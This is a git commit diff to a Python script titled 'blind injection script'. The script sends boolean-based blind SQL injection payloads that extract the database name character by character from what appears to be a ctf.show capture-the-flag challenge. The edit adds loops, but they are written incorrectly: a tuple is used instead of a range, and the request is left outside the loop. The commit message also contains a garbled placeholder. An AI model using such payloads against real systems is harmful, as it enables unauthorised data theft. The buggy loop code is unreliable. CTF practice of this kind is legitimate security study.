4271b20e3100096caf7d6e2136db717d08451477
whb54012 <1226844928@qq.com>
2026-07-21 10:52:30 +0000

    自动提交：更新 ${2026/7/21 18:52ilenPM52e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -1,6 +1,6 @@
 import requests
 url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id="
-num1 = 1
-num2 = 97
-data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
+for num1 in (1,20):
+    for num2 in(65,123):
+        data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
 result = requests.get(url + data)
